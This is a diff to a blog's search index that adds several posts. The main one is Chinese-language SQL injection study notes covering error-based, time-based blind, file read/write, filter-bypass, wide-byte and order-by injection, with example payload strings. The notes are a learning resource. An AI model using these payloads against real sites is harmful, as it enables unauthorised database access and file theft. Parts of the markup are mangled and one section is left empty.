@@ -181,4 +181,100 @@
         <category>攻防</category>
       </categories>
   </entry>
+  <entry>
+    <title>123</title>
+    <url>/2021/03/30/123/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>123</title>
+    <url>/2020/10/12/123/</url>
+    <content><![CDATA[<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Document</title>
+</head>
+<body>
+	<img data-src="../metasploitimg/001.png">
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>]]></content>
+  </entry>
+  <entry>
+    <title>spider</title>
+    <url>/2021/03/24/spider/</url>
+    <content><![CDATA[<h2 id="categoried-爬虫学习"><a href="#categoried-爬虫学习" class="headerlink" title="categoried:爬虫学习"></a>categoried:爬虫学习</h2><p>metasploit的学习与使用</p>
+<a id="more"></a>
+<hr>
+<p><strong><em>urllib库的使用</em></strong><br>   |模块|作用|<br>   |:-:|:-:|<br>   |request|最基本的http请求模块,用来模拟发送请求|<br>   |error|异常处理模块，如果请求错误，可以使用这个模块来捕获异常|<br>   |parse|工具模块,主要是针对url进行处理|<br>   |robotparser|主要是用来识别网站的robots.txt文件，判断网站是否可以爬取|</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入学习</title>
+    <url>/2021/04/07/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>sql注入学习</p>
+<a id="more"></a>
+<hr>
+<p><strong><em>sql函数介绍</em></strong><br>   #增：insert into table values(‘列名’,’列名’,’列名’)<br>   #改：update table set 列名=’xxx’ where 条件<br>   #删：delete from table where 条件</p>
+<p><strong><em>关键字介绍</em></strong><br>   |关键字|作用|<br>   |:-:|:-:|<br>   |@@version|查看数据库版本信息|<br>   |@@basedir|查看数据库路径|<br>   |database()|查看当前数据库|<br>   |user()|查看数据库当前用户|<br>   |@@version_compile_os|操作系统版本|<br>   获取这些信息对我们后面的渗透有作用，毕竟信息越多，渗透成功的可能性越大。<br><strong><em>函数介绍</em></strong><br>   |函数|作用|<br>   |:-:|:-:|<br>   |length()|判断字符长度|<br>   |if(a,b,c)|如果a正确，则执行b否则执行c|<br>   |concat|将多个字符串谅解为一个字符串，无符号|<br>   |concat_ws|以特定符号链接字符串|<br>   |group_concat|将产生同一分组的值连接起来|<br>   |left(str,a)|从左侧截取字符串的前a位|<br>   |substr(a,b,c)|从b位置开始截取a字符串的第c位|<br>   |substring|同substr|<br>   |mid(a from b for c)|同substr函数,如果‘,’被过滤，可以使用这种写法|<br>   |ascii(str)|将某个字符转换为ascii值|<br>   |ord(str)|同ascii函数|<br>   |IFNULL(a,b)|第一个参数为NULL就返回b.|<br>   |CAST(a as b)|将a转换为b类型，b不能为自己定义的类型|</p>
+<p>   示例：</p>
+<ul>
+<li>select concat(id,username,password) from user。  将user表中id,username,password连接起来输出。</li>
+<li>group_concat常于group by使用，用于将group by产生的相同的分组联合起来，如select group_concat(id) from user group by name。就是将user表中相同人名的id值连接起来。在sql注入中，select group_concat(table_name) where table_schema=database();你可以使用group_concat将当前数据库中所有表单的名字输出。<br><strong><em>探测注入点</em></strong></li>
+<li>1’ and 1=——‘<br><strong><em>基于报错的sql盲注</em></strong><h5 id="count-floor-rand-group-by联合进行报错回显"><a href="#count-floor-rand-group-by联合进行报错回显" class="headerlink" title="count(),floor(),rand(),group by联合进行报错回显"></a>count(),floor(),rand(),group by联合进行报错回显</h5></li>
+<li>rand()函数随机返回0<del>1之间的一个随机数，rand(0)固定返回0，rand()*2就是返回0</del>2之间的随机数。</li>
+<li>floor()函数返回括等于或小于括号值的最大整数,当floor与rand(0)*2结合就会产生一个数列011011。</li>
+<li>count()用于计数<br>#报错原理：count()与group by结合起来，在进行计数时会先建立虚拟表，虚拟表有key代表主键，value代表数量。上面floor(rand(0)<em>2)产生了一个数列011011。rand函数在进行计数的时候会被多次计算,即插入key值不存在时会在计算一次floor(rand(0)*2),按照上面的数列，<br>第一次计算时为0,0不存在会插入虚拟表中,同时在进行计算一次，这时插入的就是key为1,value为1。在继续往下进行,这时就是第三<br>次计算，值为1，表中存在,直接插入，这时表中key为1 vallue为2。继续进行，rand进行第四次计算值为0,表中不存在，在计算一次，<br>值为1进行插入，但是已经存在1，key值不能重复,这时就会报错。<br>#简化的语句：select count(</em>) from information_schema.tables group by concat(database(),floor(rand(0)<em>2))<br>#关键表被禁用可以这样写:select count(</em>) from(select 1 union select null union select !1)a group by concat(database(),floor(rand(0)*2))<br>#rand被禁用还可以这样写:select min(@a:=1) from information_schema.tables group by concat(user(),@a=(@a+1)%2)<br>#####利用xpath函数(extractvalue，updatevalue)进行报错注入</li>
+<li>extractvalue(目标xml文档，xml路径)。在xml查找时路径格式应该为/a/b/c。如果写入其他格式就会报错。并且返回报错的内容。</li>
+<li>updatexml(目标文档，xml路径，更新的内容)，报错同上。<br>#extractvalue(0x7e,concat(0x7e,((select count(<em>) from mysql.user)&lt;0)))–+<br>#or updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) or 1=’1<br>**</em>基于延时的sql盲注***<br>#####if,ascii,substr的结合使用</li>
+<li>if(ascii(substr((slect user()),1,1))=num,1,sleep(num))</li>
+<li>if(ORD(mid((select user()),1,1))=num,1,sleep(num))<br>#and if(ascii(substr((select user()),1,1))=80,1,sleep(5))–+<br><strong><em>sql注入关于文件</em></strong><br>#向数据库中写入文件(into outfile)</li>
+<li>简单的语句：union select 1,2,3 into outfile “文件路径记得转义斜杠” –+<br>#将数据库中的文件导出</li>
+<li>导出文件需要完全可读权限，而且文件必须存在在服务器上，路径的是绝对路径，文件大小必须小于max_allowed_packet</li>
+<li>简单的语句union select 1,2,load_file(“path”) –+</li>
+<li>联合起来： union select 1,2,load_file(“path”) into outfile “path” –+ 这个需要开启secure_file_prive=<br>#修改文件操作</li>
+<li>union select 1,2,into outfile “path” lines terminated by xxxx<br><strong><em>sql注入关于转义函数</em></strong></li>
+<li>php默认对所有提交的数据自动调用转义函数(addslashes())</li>
+<li>受addslashes()函数影响的字符 “‘“,’”‘,”&quot;,”NULL”</li>
+<li>受mysql_real_escape_string()函数影响的字符 “\x00”,”\n”,”\r”,”&quot;,”‘“,”””,”\x1a”<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">stripslashes()</td>
+<td align="center">删除由addashles函数添加的反斜杠，也就是’\‘变为’&#39;,’&#39;‘变为’’’</td>
+</tr>
+<tr>
+<td align="center">mysql_real_escape_string()</td>
+<td align="center">函数转义sql使用字符串中的特殊字符,成功返回true</td>
+</tr>
+<tr>
+<td align="center">get_magic_quotes_gpc()</td>
+<td align="center">对提交的字符串进行检测是否转义，高版本已启用</td>
+</tr>
+<tr>
+<td align="center"><strong><em>sql注入关于过滤</em></strong></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+</li>
+<li>对于or/and的过滤 可以使用 双写 ‘/**/‘, &amp;&amp;或||,hex，urlencode编码来绕过</li>
+<li>对于空格可以嵌套(),/<strong>/或者用一些特殊字符替换,如：%09(TAB键),%0a(新的一行),%0c(新的一页),%0d(return),%0b(TAB垂直,windwos下可以解析),%a0(空格)<br>*</strong>sql关于宽字节注入***<br>#原理：</li>
+<li>&#39;的url编码为%5c%27</li>
+<li>mysql使用gbk编码会认为两个字符为一个汉字。如果过滤”‘“采用的是反斜杠转义,那么可以采用%df去与%5c结合绕过过滤。</li>
+<li>简单的语句：-1%20%df%27union%20select%201,2,3–+;这种仅限于get型，如果是post则需要将utf-8的”‘“转换为utf-16,或者utf-32。<br><strong><em>sql关于order by之后的注入</em></strong><br>#sql语句：select * from user order by xxx</li>
+<li>order by注入是按照某一列进行排序，不能使用and 1=1来判断是否存在注入</li>
+<li>简单的语句：?sort=(select count(<em>) from information_schema.columns group by concat(0x7e,(select user()),0x7e,floor(rand(0)</em>2)))–+</li>
+<li>如果order by后面跟的是类似于id这种数值型参数，那么可以使用异或字符与正则匹配进行注入。如：?sort=异或(select(select user())regexp ‘异或xx’<br>   如果正则匹配返回正确,那么他会返回二进制数值的1与前面的数值进行异或，那么数据的排序就会乱掉不再是升序排序。<br><strong><em>sql注入绕过waf</em></strong></li>
+<li></li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+  </entry>
 </search>
